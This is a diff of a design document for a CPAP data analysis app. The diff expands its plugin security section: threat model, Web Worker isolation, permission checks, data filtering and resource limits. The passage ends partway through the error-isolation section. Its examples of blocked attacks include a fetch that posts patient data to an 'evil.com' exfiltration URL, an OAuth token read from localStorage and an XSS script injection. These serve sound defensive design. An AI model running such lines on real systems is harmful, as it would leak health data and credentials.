@@ -1375,286 +1375,2357 @@ function validateExportJSON(data: ExportData): void {
 
 ---
 
-## 8. Plugin Security Model
+## 8. Plugin Security & Sandboxing
 
-### 8.1 Sandboxing Strategy
+This section addresses **QA GAP-7 (IMPORTANT)**: comprehensive plugin security architecture to prevent malicious or buggy plugins from accessing user data inappropriately, crashing the application, or compromising privacy.
 
-**Isolation Boundaries**:
+### 8.1 Plugin Threat Model
+
+Third-party plugins represent a significant attack surface. The plugin system must defend against three threat categories:
+
+#### 8.1.1 Malicious Plugins
+
+**Threat**: Plugins intentionally designed to harm users or exfiltrate data.
+
+**Attack Vectors**:
+
+- **Data Exfiltration**: Plugin makes unauthorized network requests to send PHI to attacker-controlled servers
+- **XSS Injection**: Plugin injects malicious scripts into rendered UI components (for visualization plugins)
+- **Storage Corruption**: Plugin writes malformed data that crashes the application or corrupts analysis results
+- **Credential Harvesting**: Plugin attempts to access API keys, OAuth tokens, or integration credentials
+- **Backdoor Installation**: Plugin installs persistent malicious code in ServiceWorker or storage
+
+**Mitigation Priority**:
+
+1. **CRITICAL**: Prevent network access unless explicitly permitted and user-approved (`network` permission)
+2. **CRITICAL**: Isolate plugin execution in Web Workers (no DOM/storage direct access)
+3. **HIGH**: Validate all plugin outputs before writing to storage
+4. **HIGH**: Content Security Policy prevents inline scripts and eval()
+5. **MEDIUM**: Code integrity verification (hash checking)
+
+#### 8.1.2 Buggy Plugins
+
+**Threat**: Well-intentioned plugins with implementation flaws that cause harm.
+
+**Attack Vectors**:
+
+- **Crashes**: Unhandled exceptions crash the application
+- **Memory Leaks**: Plugin allocates memory without freeing, causing browser OOM
+- **Infinite Loops**: Plugin hangs indefinitely, freezing the application
+- **Corrupted Analysis**: Plugin math errors produce incorrect clinical metrics (dangerous for health monitoring)
+- **Race Conditions**: Plugin concurrent access causes data inconsistency
+
+**Mitigation Priority**:
+
+1. **CRITICAL**: Worker timeout enforcement (kill runaway plugins)
+2. **CRITICAL**: Error isolation (plugin crashes don't crash main app)
+3. **HIGH**: Memory limits per worker instance
+4. **MEDIUM**: Result validation (schema checking, bounds checking)
+5. **LOW**: Plugin test suite requirements (unit tests for correctness)
+
+#### 8.1.3 Supply Chain Attacks
+
+**Threat**: Compromised plugin dependencies introduce malicious code.
+
+**Attack Vectors**:
+
+- **Backdoored Dependencies**: Plugin depends on npm package with malicious code
+- **Typosquatting**: Plugin claims to be "@resmed-official/parser" but is actually a fake
+- **Compromised Maintainer**: Legitimate plugin updated with malicious version by compromised developer account
+- **Vulnerable Dependencies**: Plugin uses outdated dependencies with known vulnerabilities
+
+**Mitigation Priority**:
+
+1. **CRITICAL**: Plugin code review before installation (automated + manual)
+2. **HIGH**: Dependency scanning (npm audit, Snyk, etc.)
+3. **HIGH**: Plugin signing and verification (future enhancement)
+4. **MEDIUM**: Version pinning (prevent automatic updates without user approval)
+5. **MEDIUM**: Plugin provenance tracking (verify source repository)
+
+**Mitigation Priority Matrix**:
+
+```text
+Threat Category          | Prevention Priority | Detection Priority | Response Priority
+-------------------------|--------------------|--------------------|------------------
+Data Exfiltration        | CRITICAL           | HIGH               | CRITICAL
+XSS Injection           | CRITICAL           | MEDIUM             | HIGH
+Storage Corruption      | HIGH               | HIGH               | MEDIUM
+Crashes/Hangs           | CRITICAL           | CRITICAL           | LOW
+Memory Leaks            | HIGH               | MEDIUM             | MEDIUM
+Corrupted Analysis      | MEDIUM             | HIGH               | HIGH
+Supply Chain Compromise | HIGH               | MEDIUM             | CRITICAL
 ```
-┌──────────────────────────────────────────────────┐
-│  Application Core (Trusted)                     │
-│  ┌────────────────────────────────────────────┐ │
-│  │  Plugin Manager                            │ │
-│  │  - Loads plugins                           │ │
-│  │  - Validates plugin manifests              │ │
-│  │  - Enforces permissions                    │ │
-│  └────────────────────────────────────────────┘ │
-└──────────────────────────────────────────────────┘
-                    │
-                    ▼
-┌──────────────────────────────────────────────────┐
-│  Plugin Sandbox (Untrusted)                     │
-│  ┌────────────────────────────────────────────┐ │
-│  │  Third-Party Plugin Code                   │ │
-│  │  - Receives DataProvider interface only   │ │
-│  │  - No direct access to IndexedDB/OPFS     │ │
-│  │  - No direct access to fetch/network      │ │
-│  │  - No access to user credentials          │ │
-│  └────────────────────────────────────────────┘ │
-└──────────────────────────────────────────────────┘
-```
 
-**Plugin Execution in Worker**:
+### 8.2 Web Worker Isolation
+
+**Why Web Workers Provide Isolation**:
+
+Web Workers execute JavaScript in a **separate thread with a completely isolated global scope**. This provides the foundation for plugin sandboxing:
+
+1. **No DOM Access**: Workers cannot access `window`, `document`, or any DOM APIs. Plugins cannot manipulate UI, inject scripts, or read sensitive page content.
+
+2. **No Storage APIs**: Workers do not have direct access to `localStorage`, `sessionStorage`, or `document.cookie`. Plugins cannot steal credentials or read other plugins' cached data.
+
+3. **Separate Global Scope**: Each worker has its own global object. Plugins cannot access variables, functions, or state from the main thread or other plugins.
+
+4. **Controlled Communication**: Workers communicate with main thread only via `postMessage()` (wrapped by Comlink). All data transfers are serialized—plugins cannot pass references to live objects.
+
+**What Plugins CAN Access**:
+
 ```typescript
-// src/core/plugin-manager.ts
-async function executePlugin(
-  plugin: AnalysisPlugin,
-  input: AnalysisInput
-): Promise<AnalysisOutput> {
-  // Load plugin in dedicated worker
-  const worker = new Worker(new URL('./plugin-sandbox.worker.ts', import.meta.url), {
-    type: 'module'
+// Inside plugin worker context
+// ✅ Allowed:
+- self (WorkerGlobalScope, not Window)
+- Comlink API provided by plugin manager
+- Data explicitly passed via postMessage (copied, not referenced)
+- Worker-scoped APIs: setTimeout, setInterval, fetch (if permitted)
+- Typed arrays, ArrayBuffers (data processing)
+- Math, Date, console, WebAssembly
+- crypto.subtle (Web Crypto API)
+
+// ❌ Denied:
+- window, document, DOM APIs
+- localStorage, sessionStorage, indexedDB (direct)
+- navigator.storage, OPFS (direct)
+- document.cookie
+- alert(), confirm(), prompt()
+- Other workers or plugin instances
+```
+
+**What Plugins CANNOT Access**:
+
+```typescript
+// Example of plugin attempting unauthorized access:
+
+// ❌ Fails: DOM access
+const elem = document.getElementById('secret-data');
+// ReferenceError: document is not defined
+
+// ❌ Fails: Storage access
+const token = localStorage.getItem('fitbit-oauth-token');
+// ReferenceError: localStorage is not defined
+
+// ❌ Fails: Network (without permission)
+await fetch('https://evil.com/exfiltrate', { method: 'POST', body: patientData });
+// Throws SecurityError if plugin lacks 'network' permission
+
+// ❌ Fails: Other plugin data
+const otherPluginData = self.pluginRegistry.getPlugin('other-plugin').data;
+// ReferenceError: pluginRegistry is not defined (not exposed to workers)
+
+// ❌ Fails: OPFS direct access
+const root = await navigator.storage.getDirectory();
+// Available in workers BUT restricted by permission model
+```
+
+**Limitations of Worker Isolation (Not a Security Sandbox)**:
+
+⚠️ **Important**: Web Workers are **NOT** a security sandbox. They provide isolation but not true confinement:
+
+1. **Shared Origin**: Workers run in the same origin as main thread. Same-origin storage is technically accessible if worker has storage APIs.
+   - **Mitigation**: We do not expose storage APIs to plugin workers. Plugins must use controlled DataProvider API.
+
+2. **Network Access**: Workers can make `fetch()` calls if the API is available.
+   - **Mitigation**: Network permission required; fetch is wrapped to enforce permission checks.
+
+3. **Resource Exhaustion**: Workers can consume CPU and memory without browser-enforced limits.
+   - **Mitigation**: Application-level timeouts, memory monitoring, worker termination.
+
+4. **No Filesystem Sandbox**: Workers in Node.js (testing) have filesystem access.
+   - **Mitigation**: Production plugins run in browser workers only; Node.js test environment uses mocks.
+
+**Trust Model**: We treat plugin code as **untrusted** but rely on **browser-provided isolation** (separate worker threads) combined with **application-level access controls** (permission system, API wrapping, data filtering).
+
+### 8.3 Plugin Permission System
+
+Plugins must declare all required capabilities in their manifest. Permissions are enforced at runtime with explicit user consent.
+
+#### 8.3.1 Permission Types
+
+```typescript
+/**
+ * Plugin permission grants.
+ * Every permission must have user consent and is enforced at runtime.
+ */
+type PluginPermission =
+  // Data Access Permissions
+  | 'storage.read'            // Read data from storage via controlled API
+  | 'storage.write'           // Write analysis results back to storage
+  | 'storage.delete'          // Delete cached results or temporary data
+  
+  // Data Scope Permissions (combine with storage.read)
+  | 'data.sessions'           // Access session metadata (dates, duration, machine)
+  | 'data.aggregates'         // Access nightly aggregate statistics
+  | 'data.events'             // Access respiratory event data (apneas, hypopneas)
+  | 'data.signals'            // Access high-resolution time-series signals
+  | 'data.notes'              // Access user notes and annotations
+  | 'data.integrations.fitbit'   // Access Fitbit integration data
+  | 'data.integrations.weather'  // Access weather data
+  
+  // Network Permissions (generally denied for analysis plugins)
+  | 'network'                 // Make external HTTP requests
+  
+  // Export Permissions
+  | 'export'                  // Export data in custom formats
+  
+  // UI Permissions (for visualization plugins)
+  | 'ui.render'               // Render React components (sandboxed)
+
+/**
+ * Complete plugin manifest schema with integrity and permission fields
+ */
+interface PluginManifest {
+  // Identity
+  id: string;                        // Unique plugin ID (reverse domain: com.example.plugin)
+  name: string;                      // Human-readable name
+  version: string;                   // Semantic version
+  author: string;                    // Developer name/organization
+  description: string;               // What the plugin does
+  
+  // Plugin type (determines API interface)
+  type: 'machine' | 'analysis' | 'visualization' | 'integration' | 'export';
+  
+  // Security
+  permissions: PluginPermission[];   // Required permissions
+  integrityHash: string;             // SHA-256 hash of plugin code
+  sourceUrl?: string;                // GitHub repo or package URL for audit
+  
+  // Data requirements
+  dataRequirements?: {
+    signals?: string[];              // Signal channels needed (e.g., ['Flow', 'Pressure'])
+    minSessionCount?: number;        // Minimum sessions required for analysis
+    maxMemoryMB?: number;            // Expected memory usage
+  };
+  
+  // Resource limits
+  timeoutMs?: number;                // Max execution time (default: 60s)
+  maxMemoryMB?: number;              // Memory limit (default: 512MB)
+  
+  // Entry point
+  main: string;                      // Worker script path or bundle
+}
+```
+
+#### 8.3.2 User Consent Flow
+
+**Installation consent dialog**:
+
+```typescript
+async function installPlugin(manifest: PluginManifest): Promise<void> {
+  // 1. Validate manifest schema
+  const schemaValidation = validateManifestSchema(manifest);
+  if (!schemaValidation.valid) {
+    throw new ValidationError(
+      `Invalid plugin manifest: ${schemaValidation.errors.join(', ')}`
+    );
+  }
+  
+  // 2. Show permission consent UI
+  const consent = await showPluginConsentDialog({
+    pluginName: manifest.name,
+    author: manifest.author,
+    description: manifest.description,
+    permissions: manifest.permissions,
+    dataRequirements: manifest.dataRequirements,
+    sourceUrl: manifest.sourceUrl
   });
   
-  // Create sandboxed DataProvider
-  const dataProvider = createSandboxedDataProvider(plugin.dataRequirements);
+  if (!consent.granted) {
+    throw new UserCancelledError('User denied plugin permissions');
+  }
   
-  // Execute with timeout
-  const result = await Promise.race([
-    executePluginInWorker(worker, plugin, input, dataProvider),
-    timeout(plugin.metadata.timeout ?? 60_000)
-  ]);
+  // 3. Store plugin with granted permissions
+  const installRecord: PluginInstallRecord = {
+    manifest,
+    installedAt: new Date().toISOString(),
+    grantedPermissions: consent.grantedPermissions, // User can deny specific permissions
+    enabled: true,
+    integrityVerified: false
+  };
   
-  // Terminate worker
-  worker.terminate();
+  // 4. Verify code integrity
+  const integrityCheck = await verifyPluginIntegrity(manifest);
+  if (!integrityCheck.valid) {
+    throw new SecurityError(
+      `Plugin integrity verification failed: ${integrityCheck.error}`
+    );
+  }
+  installRecord.integrityVerified = true;
   
-  return result;
-}
-```
-
-### 8.2 Permission Model
-
-**Plugin Manifest**:
-```typescript
-interface PluginManifest {
-  id: string;
-  name: string;
-  version: string;
-  permissions: Permission[];
-  dataRequirements: DataRequirements;
+  // 5. Save to plugin registry
+  await pluginRegistry.install(installRecord);
+  
+  console.log(`[PluginManager] Installed plugin: ${manifest.id}@${manifest.version}`);
 }
 
-type Permission =
-  | 'read:sessions'
-  | 'read:aggregates'
-  | 'read:events'
-  | 'read:signals'
-  | 'read:integration:fitbit'
-  | 'read:integration:weather'
-  | 'network:fetch'
-  | 'storage:cache';
+/**
+ * User-facing permission descriptions
+ */
+const PERMISSION_DESCRIPTIONS: Record<PluginPermission, {
+  label: string;
+  description: string;
+  risk: 'LOW' | 'MEDIUM' | 'HIGH';
+}> = {
+  'storage.read': {
+    label: 'Read Your CPAP Data',
+    description: 'Access your therapy sessions, statistics, and events for analysis.',
+    risk: 'MEDIUM'
+  },
+  'storage.write': {
+    label: 'Save Analysis Results',
+    description: 'Store computed results (cached calculations, derived metrics).',
+    risk: 'LOW'
+  },
+  'data.signals': {
+    label: 'Access High-Resolution Signals',
+    description: 'Read raw waveform data (flow, pressure) at 25-50 Hz resolution.',
+    risk: 'HIGH' // Most sensitive data
+  },
+  'network': {
+    label: 'Make Network Requests',
+    description: 'Send data to external services (e.g., cloud ML inference).',
+    risk: 'HIGH' // Privacy risk
+  },
+  'export': {
+    label: 'Export Data',
+    description: 'Generate files for download (PDF reports, CSV exports).',
+    risk: 'MEDIUM'
+  },
+  // ... (all permissions)
+};
 
-interface DataRequirements {
-  stores: StoreName[];
-  signals?: string[];
-  minSampleSize: number;
-}
-```
-
-**Permission Enforcement**:
-```typescript
-function createSandboxedDataProvider(
-  plugin: PluginManifest
-): DataProvider {
-  return {
-    async getNightlyAggregates(dateRange, metrics, machineIds) {
-      // Check permission
-      if (!plugin.permissions.includes('read:aggregates')) {
-        throw new SecurityError(
-          `Plugin ${plugin.id} does not have permission read:aggregates`,
-          'PERMISSION_DENIED'
-        );
-      }
+/**
+ * Permission consent dialog component
+ */
+function PluginConsentDialog({ plugin, onConsent }: {
+  plugin: PluginManifest;
+  onConsent: (granted: boolean, selectedPermissions: PluginPermission[]) => void;
+}) {
+  const [selectedPermissions, setSelectedPermissions] = useState<Set<PluginPermission>>(
+    new Set(plugin.permissions)
+  );
+  
+  return (
+    <Dialog>
+      <DialogTitle>Install Plugin: {plugin.name}</DialogTitle>
+      <DialogContent>
+        <Typography variant="body1">{plugin.description}</Typography>
+        <Typography variant="body2">By {plugin.author}</Typography>
+        
+        <Box mt={2}>
+          <Typography variant="h6">Requested Permissions</Typography>
+          {plugin.permissions.map(perm => {
+            const info = PERMISSION_DESCRIPTIONS[perm];
+            return (
+              <PermissionCard key={perm} selected={selectedPermissions.has(perm)}>
+                <Checkbox
+                  checked={selectedPermissions.has(perm)}
+                  onChange={() => togglePermission(perm)}
+                />
+                <PermissionBadge risk={info.risk}>{info.risk}</PermissionBadge>
+                <Typography variant="subtitle1">{info.label}</Typography>
+                <Typography variant="body2">{info.description}</Typography>
+              </PermissionCard>
+            );
+          })}
+        </Box>
+        
+        {plugin.sourceUrl && (
+          <Link href={plugin.sourceUrl} target="_blank">
+            View Source Code
+          </Link>
+        )}
+      </DialogContent>
       
-      // Fetch data
-      return await fetchNightlyAggregates(dateRange, metrics, machineIds);
-    },
+      <DialogActions>
+        <Button onClick={() => onConsent(false, [])}>Deny</Button>
+        <Button
+          variant="contained"
+          onClick={() => onConsent(true, Array.from(selectedPermissions))}
+        >
+          Allow
+        </Button>
+      </DialogActions>
+    </Dialog>
+  );
+}
+```
+
+#### 8.3.3 Runtime Permission Checking
+
+Every plugin API call is guarded by permission checks:
+
+```typescript
+/**
+ * DataProvider API wrapper with permission enforcement.
+ * This is the ONLY interface plugins have to access application data.
+ */
+class SecureDataProvider {
+  constructor(
+    private plugin: PluginManifest,
+    private grantedPermissions: Set<PluginPermission>
+  ) {}
+  
+  /**
+   * Check if plugin has required permission
+   */
+  private enforce(permission: PluginPermission): void {
+    if (!this.grantedPermissions.has(permission)) {
+      throw new SecurityError(
+        `Permission denied: Plugin "${this.plugin.id}" does not have permission "${permission}"`,
+        'PERMISSION_DENIED',
+        { pluginId: this.plugin.id, permission }
+      );
+    }
+  }
+  
+  /**
+   * Get session metadata (dates, durations, machine info)
+   */
+  async getSessions(filter?: SessionFilter): Promise<SessionMetadata[]> {
+    this.enforce('storage.read');
+    this.enforce('data.sessions');
     
-    async getSignalData(sessionId, channelName) {
-      // Check permission
-      if (!plugin.permissions.includes('read:signals')) {
-        throw new SecurityError(
-          `Plugin ${plugin.id} does not have permission read:signals`,
-          'PERMISSION_DENIED'
-        );
+    // Fetch from storage
+    const sessions = await sessionStore.query(filter);
+    
+    // Strip PHI-like fields if not explicitly requested
+    return sessions.map(s => ({
+      id: s.id,
+      date: s.date,
+      duration: s.duration,
+      machineModel: s.machineModel,
+      // Omit: notes, user metadata
+    }));
+  }
+  
+  /**
+   * Get high-resolution signal data (requires highest permission level)
+   */
+  async getSignalData(
+    sessionId: string,
+    channelName: string
+  ): Promise<Float32Array> {
+    this.enforce('storage.read');
+    this.enforce('data.signals');
+    
+    // Verify channel is declared in manifest
+    const declared = this.plugin.dataRequirements?.signals || [];
+    if (!declared.includes(channelName)) {
+      throw new SecurityError(
+        `Undeclared signal access: Plugin manifest must declare signal "${channelName}"`,
+        'UNDECLARED_DATA_ACCESS',
+        { pluginId: this.plugin.id, channelName, declaredSignals: declared }
+      );
+    }
+    
+    // Fetch signal from OPFS
+    return await signalStorage.getSignal(sessionId, channelName);
+  }
+  
+  /**
+   * Write analysis results back to storage
+   */
+  async saveAnalysisResult(result: AnalysisResult): Promise<void> {
+    this.enforce('storage.write');
+    
+    // Validate result schema before saving
+    const validation = validateAnalysisResult(result);
+    if (!validation.valid) {
+      throw new ValidationError(
+        `Invalid analysis result: ${validation.errors.join(', ')}`
+      );
+    }
+    
+    // Tag result with plugin ID for provenance
+    const tagged: StoredAnalysisResult = {
+      ...result,
+      pluginId: this.plugin.id,
+      computedAt: new Date().toISOString()
+    };
+    
+    await analysisStore.save(tagged);
+  }
+  
+  /**
+   * Make external network request (requires network permission)
+   */
+  async fetch(url: string, options?: RequestInit): Promise<Response> {
+    this.enforce('network');
+    
+    // Log network requests for audit
+    console.warn(
+      `[Security] Plugin "${this.plugin.id}" making network request to ${url}`
+    );
+    
+    // Apply timeout
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 30_000);
+    
+    try {
+      return await fetch(url, {
+        ...options,
+        signal: controller.signal
+      });
+    } finally {
+      clearTimeout(timeout);
+    }
+  }
+}
+```
+
+### 8.4 Data Access Control
+
+**Principle**: Plugins receive **only explicitly passed data**, never direct storage access.
+
+#### 8.4.1 Data Filtering
+
+Plugins receive only the data they need for their declared functionality:
+
+```typescript
+/**
+ * Filter data before passing to plugin
+ */
+async function preparePluginInput(
+  plugin: PluginManifest,
+  userSelection: UserDataSelection
+): Promise<PluginInput> {
+  const dataProvider = createSecureDataProvider(plugin);
+  
+  // Example: Analysis plugin needs aggregate stats only, not raw signals
+  if (plugin.type === 'analysis' && !plugin.permissions.includes('data.signals')) {
+    // Pass aggregates only (much smaller than raw signals)
+    const aggregates = await dataProvider.getNightlyAggregates(
+      userSelection.dateRange
+    );
+    
+    return {
+      type: 'aggregates',
+      data: aggregates,
+      metadata: {
+        sessionCount: aggregates.length,
+        dateRange: userSelection.dateRange
       }
+    };
+  }
+  
+  // Example: Export plugin needs full session data
+  if (plugin.type === 'export' && plugin.permissions.includes('data.signals')) {
+    const sessions = await dataProvider.getSessions(userSelection.dateRange);
+    const signals = await Promise.all(
+      sessions.map(s => dataProvider.getSignalData(s.id, 'Flow'))
+    );
+    
+    return {
+      type: 'full-sessions',
+      sessions,
+      signals
+    };
+  }
+  
+  throw new Error(`Cannot prepare input for plugin type: ${plugin.type}`);
+}
+```
+
+#### 8.4.2 Copy-on-Write (Data Cloning)
+
+Plugins receive **copies** of data, not references. This prevents plugins from modifying application state:
+
+```typescript
+/**
+ * Clone data before passing to plugin worker
+ */
+function cloneForWorker<T>(data: T): T {
+  // Use structured clone algorithm (supports typed arrays, dates, etc.)
+  return structuredClone(data);
+}
+
+async function executePlugin(
+  plugin: PluginManifest,
+  input: PluginInput
+): Promise<PluginOutput> {
+  const worker = createPluginWorker(plugin);
+  
+  // Clone input data (prevents plugin from modifying original)
+  const clonedInput = cloneForWorker(input);
+  
+  // Send via Comlink (also performs serialization/copy)
+  const result = await worker.execute(clonedInput);
+  
+  // Clone result as well (paranoid but safe)
+  return cloneForWorker(result);
+}
+```
+
+#### 8.4.3 Result Validation Before Storage
+
+All plugin outputs are validated before writing to storage:
+
+```typescript
+/**
+ * Validate plugin analysis result before saving
+ */
+function validateAnalysisResult(result: AnalysisResult): ValidationResult {
+  const errors: string[] = [];
+  
+  // Schema validation
+  if (!result.pluginId || typeof result.pluginId !== 'string') {
+    errors.push('Missing or invalid pluginId');
+  }
+  
+  if (!result.data || typeof result.data !== 'object') {
+    errors.push('Missing result data');
+  }
+  
+  // Bounds checking for clinical metrics (prevent corrupted analysis)
+  if (result.data.ahi !== undefined) {
+    if (typeof result.data.ahi !== 'number' || result.data.ahi < 0 || result.data.ahi > 200) {
+      errors.push(`Invalid AHI value: ${result.data.ahi} (must be 0-200)`);
+    }
+  }
+  
+  if (result.data.leakRate !== undefined) {
+    if (typeof result.data.leakRate !== 'number' || result.data.leakRate < 0 || result.data.leakRate > 100) {
+      errors.push(`Invalid leak rate: ${result.data.leakRate} (must be 0-100 L/min)`);
+    }
+  }
+  
+  // Size limits (prevent storage exhaustion)
+  const serialized = JSON.stringify(result);
+  const sizeMB = new Blob([serialized]).size / (1024 * 1024);
+  if (sizeMB > 10) {
+    errors.push(`Result too large: ${sizeMB.toFixed(2)}MB (limit: 10MB)`);
+  }
+  
+  return {
+    valid: errors.length === 0,
+    errors
+  };
+}
+
+/**
+ * Save plugin result with validation
+ */
+async function savePluginResult(result: AnalysisResult): Promise<void> {
+  const validation = validateAnalysisResult(result);
+  
+  if (!validation.valid) {
+    throw new ValidationError(
+      `Plugin result validation failed: ${validation.errors.join(', ')}`,
+      'INVALID_PLUGIN_OUTPUT',
+      { pluginId: result.pluginId, errors: validation.errors }
+    );
+  }
+  
+  await analysisStore.save(result);
+}
+```
+
+### 8.5 API Surface Restriction
+
+**Principle**: Plugins have access only to a **minimal, capability-based API**. No access to internal app state, other plugins, or privileged operations.
+
+#### 8.5.1 Limited Comlink API
+
+Plugins interact with the application via a restricted Comlink interface:
+
+```typescript
+/**
+ * Plugin Worker API Interface
+ * This is the COMPLETE surface area exposed to plugin code.
+ */
+interface PluginWorkerAPI {
+  /**
+   * Data access (permission-controlled)
+   */
+  dataProvider: {
+    getSessions(filter?: SessionFilter): Promise<SessionMetadata[]>;
+    getNightlyAggregates(dateRange: DateRange): Promise<AggregateStat[]>;
+    getEvents(sessionId: string): Promise<RespiratoryEvent[]>;
+    getSignalData(sessionId: string, channel: string): Promise<Float32Array>;
+    saveResult(result: AnalysisResult): Promise<void>;
+  };
+  
+  /**
+   * Logging (no PHI, captured for debugging)
+   */
+  logger: {
+    info(message: string, context?: Record<string, unknown>): void;
+    warn(message: string, context?: Record<string, unknown>): void;
+    error(message: string, error?: Error): void;
+  };
+  
+  /**
+   * Progress reporting (for long-running analyses)
+   */
+  progress: {
+    report(percent: number, message?: string): void;
+  };
+}
+
+/**
+ * Setup plugin worker with restricted API
+ */
+function createPluginWorker(plugin: PluginManifest): Worker {
+  const worker = new Worker(
+    new URL('./plugin-sandbox.worker.ts', import.meta.url),
+    { type: 'module', name: `plugin-${plugin.id}` }
+  );
+  
+  // Expose ONLY the PluginWorkerAPI via Comlink
+  const dataProvider = createSecureDataProvider(plugin);
+  const logger = createPluginLogger(plugin.id);
+  const progress = createProgressReporter(plugin.id);
+  
+  const api: PluginWorkerAPI = {
+    dataProvider: Comlink.proxy(dataProvider),
+    logger: Comlink.proxy(logger),
+    progress: Comlink.proxy(progress)
+  };
+  
+  Comlink.expose(api, worker);
+  
+  return worker;
+}
+```
+
+#### 8.5.2 No Access to Internal State
+
+Plugins cannot access application internals:
+
+```typescript
+// ❌ Plugin CANNOT do this (not exposed):
+
+// Access Zustand stores
+const userSettings = useSettingsStore.getState();
+
+// Access other plugins
+const otherPlugin = pluginRegistry.get('other-plugin-id');
+
+// Access routing
+navigate('/settings');
+
+// Access localStorage directly
+const theme = localStorage.getItem('theme');
+
+// Access service worker
+const registration = await navigator.serviceWorker.getRegistration();
+
+// Modify DOM
+document.getElementById('app').innerHTML = '<script>alert("XSS")</script>';
+```
+
+#### 8.5.3 Capability-Based Security
+
+Plugins receive **handles** (capabilities) to **specific resources** based on user selection:
+
+```typescript
+/**
+ * User selects specific sessions for analysis
+ * Plugin receives ONLY those sessions
+ */
+async function runAnalysisPlugin(
+  plugin: PluginManifest,
+  selectedSessionIds: string[]
+): Promise<AnalysisResult> {
+  const worker = createPluginWorker(plugin);
+  
+  // Filter data to user selection only
+  const sessions = await sessionStore.getByIds(selectedSessionIds);
+  
+  // Plugin receives capability to access ONLY these sessions
+  const capability = createSessionCapability(selectedSessionIds);
+  
+  return await worker.execute({
+    sessions,
+    capability // Capability token, not raw storage access
+  });
+}
+```
+
+### 8.6 Resource Limits
+
+**Principle**: Plugins cannot exhaust system resources and degrade application performance.
+
+#### 8.6.1 Memory Limits
+
+```typescript
+/**
+ * Worker memory monitoring (best-effort, not enforceable by spec)
+ */
+async function executePluginWithMemoryLimit(
+  plugin: PluginManifest,
+  input: PluginInput
+): Promise<PluginOutput> {
+  const worker = createPluginWorker(plugin);
+  const maxMemoryMB = plugin.maxMemoryMB || 512;
+  
+  // Monitor worker memory usage (if available)
+  if ('memory' in performance) {
+    const memoryMonitor = setInterval(() => {
+      const usage = (performance as any).memory.usedJSHeapSize / (1024 * 1024);
       
-      // Check channel name against manifest
-      if (
-        plugin.dataRequirements.signals &&
-        !plugin.dataRequirements.signals.includes(channelName)
-      ) {
-        throw new SecurityError(
-          `Plugin ${plugin.id} did not declare access to signal ${channelName}`,
-          'UNDECLARED_DATA_ACCESS'
+      if (usage > maxMemoryMB) {
+        console.error(
+          `[PluginManager] Plugin "${plugin.id}" exceeded memory limit: ${usage.toFixed(0)}MB > ${maxMemoryMB}MB`
         );
+        worker.terminate();
+        clearInterval(memoryMonitor);
       }
-      
-      // Fetch data
-      return await fetchSignalData(sessionId, channelName);
+    }, 1000);
+    
+    try {
+      return await worker.execute(input);
+    } finally {
+      clearInterval(memoryMonitor);
+    }
+  }
+  
+  // Fallback: no memory monitoring (still have timeout)
+  return await worker.execute(input);
+}
+```
+
+**Note**: JavaScript does not provide hard memory limits per worker. The memory monitoring above is **best-effort** using `performance.memory` (Chrome only). The primary protection is **execution timeout** (kills runaway workers).
+
+#### 8.6.2 CPU Time Limits
+
+```typescript
+/**
+ * Enforce plugin execution timeout
+ */
+async function executePluginWithTimeout(
+  plugin: PluginManifest,
+  input: PluginInput
+): Promise<PluginOutput> {
+  const worker = createPluginWorker(plugin);
+  const timeoutMs = plugin.timeoutMs || 60_000; // Default: 60 seconds
+  
+  const executionPromise = worker.execute(input);
+  const timeoutPromise = new Promise<never>((_, reject) => {
+    setTimeout(() => {
+      worker.terminate(); // Kill worker
+      reject(new TimeoutError(
+        `Plugin "${plugin.id}" exceeded timeout: ${timeoutMs}ms`,
+        'PLUGIN_TIMEOUT',
+        { pluginId: plugin.id, timeoutMs }
+      ));
+    }, timeoutMs);
+  });
+  
+  try {
+    return await Promise.race([executionPromise, timeoutPromise]);
+  } catch (error) {
+    worker.terminate(); // Ensure worker is killed on error
+    throw error;
+  }
+}
+```
+
+#### 8.6.3 Storage Quota Limits
+
+```typescript
+/**
+ * Prevent plugins from exhausting storage quota
+ */
+async function savePluginResultWithQuota(
+  plugin: PluginManifest,
+  result: AnalysisResult
+): Promise<void> {
+  // Check current quota usage
+  const quota = await navigator.storage.estimate();
+  const usagePercent = ((quota.usage || 0) / (quota.quota || 1)) * 100;
+  
+  if (usagePercent > 90) {
+    throw new QuotaExceededError(
+      'Storage quota exceeded. Cannot save plugin result.',
+      'STORAGE_QUOTA_EXCEEDED',
+      { usagePercent, quotaMB: (quota.quota || 0) / (1024 * 1024) }
+    );
+  }
+  
+  // Check result size
+  const resultSizeMB = new Blob([JSON.stringify(result)]).size / (1024 * 1024);
+  const maxPluginResultSizeMB = 10;
+  
+  if (resultSizeMB > maxPluginResultSizeMB) {
+    throw new ValidationError(
+      `Plugin result too large: ${resultSizeMB.toFixed(2)}MB (limit: ${maxPluginResultSizeMB}MB)`,
+      'RESULT_TOO_LARGE',
+      { pluginId: plugin.id, resultSizeMB, limitMB: maxPluginResultSizeMB }
+    );
+  }
+  
+  await analysisStore.save(result);
+}
+```
+
+#### 8.6.4 Automatic Termination on Resource Abuse
+
+```typescript
+/**
+ * Combined resource limits with automatic termination
+ */
+async function executePluginSafely(
+  plugin: PluginManifest,
+  input: PluginInput
+): Promise<PluginOutput> {
+  const worker = createPluginWorker(plugin);
+  let terminated = false;
+  
+  // Timeout guard
+  const timeoutMs = plugin.timeoutMs || 60_000;
+  const timeoutHandle = setTimeout(() => {
+    console.error(`[PluginManager] Terminating plugin "${plugin.id}": timeout`);
+    worker.terminate();
+    terminated = true;
+  }, timeoutMs);
+  
+  // Memory guard (best-effort)
+  const memoryLimitMB = plugin.maxMemoryMB || 512;
+  const memoryHandle = setInterval(() => {
+    if ((performance as any).memory) {
+      const usageMB = (performance as any).memory.usedJSHeapSize / (1024 * 1024);
+      if (usageMB > memoryLimitMB) {
+        console.error(`[PluginManager] Terminating plugin "${plugin.id}": memory limit`);
+        worker.terminate();
+        terminated = true;
+      }
+    }
+  }, 1000);
+  
+  try {
+    const result = await worker.execute(input);
+    
+    if (terminated) {
+      throw new ResourceLimitError(
+        `Plugin "${plugin.id}" was terminated for exceeding resource limits`
+      );
+    }
+    
+    return result;
+  } finally {
+    clearTimeout(timeoutHandle);
+    clearInterval(memoryHandle);
+    worker.terminate(); // Always terminate when done
+  }
+}
+```
+
+### 8.7 Error Isolation
+
+**Principle**: Plugin failures must not crash the main application. Users should always have a recovery path.
+
+#### 8.7.1 Plugin Crashes Don't Crash Main App
+
+```typescript
+/**
+ * Execute plugin with error isolation
+ */
+async function executePluginIsolated(
+  plugin: PluginManifest,
+  input: PluginInput
